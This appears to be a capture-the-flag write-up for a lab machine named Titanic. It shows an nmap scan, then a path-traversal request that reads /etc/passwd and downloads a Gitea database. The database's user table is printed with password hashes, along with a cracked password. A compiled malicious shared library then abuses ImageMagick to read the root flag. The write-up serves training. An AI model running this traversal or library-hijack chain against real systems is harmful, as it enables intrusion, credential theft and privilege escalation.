1,Recon
port scan
```
nmap -sC -sV -Pn 10.10.11.55 -oN ./nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 11:19 AEDT
Nmap scan report for 10.10.11.55
Host is up (0.012s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.74 seconds
```
Page check
![[Screenshot 2025-02-16 at 11.25.07 AM.png]]
By using the ffuf to enumerate the web-contents, I can only find the `/book`, and nothing here.

But we can also find another sub-domain here `dev.titanic.htb`
![](images/Pasted%20image%2020250216112921.png)
And I can find the version of Gitea `Version: 1.22.1`
From `Exploit` label, we can find a public repository
![](images/Pasted%20image%2020250216113341.png)
Then we can find the source code of the main-domain service, and we can find the LFI for `/download`
![](images/Pasted%20image%2020250216113814.png)
We can try to prove it
http://titanic.htb/download?ticket=../../../../etc/passwd
Then we get the `/etc/passwd` file
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
In this place, developer would be our target here, we can try to get its `id_rsa`, but there is no id_rsa to get
So, let's try to get the `gitea.db` from the home template of developer
`curl "http://titanic.htb/download?ticket=../../../../../../../../../../home/developer/gitea/data/gitea/gitea.db" --output gitea.db`
Then we can get the hash of developer
```
sqlite> select * from user;
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1739647463|1739647463|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
3|test|test||test@test.com|0|enabled|9dc4f953ea5319eaeb3ac3e50d253993198634870708bd794bd1efa6fd43de0ba112781df3809adfef01648f54211201e2eb|pbkdf2$50000$50|0|0|0||0|||46c8c984551f7de9b64ea4e6373e2b62|e4b82a344a4e3e4d3f98fda81ea1abfc|en-US||1739652077|1739652962|1739652962|0|-1|1|0|0|0|0|1|0|b642b4217b34b1e8d3bd915fc65c4452|test@test.com|0|0|0|0|0|0|0|0|0|unified|gitea-auto|0
4|abc|abc||abc@def.com|0|enabled|ad189d5a43407d4aa431db8821e420028a1610f24d05114e6dbd64021bdde0931a3532de8d99bdf12033cc86b09f3730f607|pbkdf2$50000$50|0|0|0||0|||165262c5ef766cfb880c2f65604241ab|b0e49dd381b0d68a693954d003106287|en-US||1739657270|1739658230|1739657270|0|-1|1|0|0|0|0|1|0|b188d046267bb5cddbc457580551297d|abc@def.com|0|0|0|0|0|0|0|0|0|unified|gitea-auto|0
5|admin1|admin1||admin1@titanic.htb|0|enabled|e0bb63860d33f22300e20a3f481ebaa9860c76ef5c6c5dc685ecd53d1c8d635a1f44f11b88230547209846b1373cd6770423|pbkdf2$50000$50|0|0|0||0|||64b82b0a562e6d38ba2f345eb5c491b3|8532b61d0f8eb41f47081e0ecadda6d2|en-US||1739663217|1739663217|1739663217|0|-1|1|0|0|0|0|1|0|1882b2110b401e1b49aaffb53a1782b2|admin1@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0

```
By cracking this hash and we can get the password of developer `developer:25282528`
Then we can use ssh to get the user shell.

2, shell as root
Firstly I would like check the netstate and `sudo -l`
```
developer@titanic:~$ sudo -l
[sudo] password for developer: 
Sorry, user developer may not run sudo on titanic.
developer@titanic:~$ netstat -ntlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:45201         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1167/python3        
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```
Port 5000 is the flask service, port 3000 is the gitea docker image.

Come to `/opt/app/static/assets/images`
Then we can check the version of `ImageMagick`
```
developer@titanic:/opt/app/static/assets/images$ magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)

```
Then we can find the exploit of this version
```
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
Arbitrary Code Execution in `AppImage` version `ImageMagick`

```
So the payload would be 
```
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
EOF

magick /dev/null /dev/null

cat /tmp/root.txt
```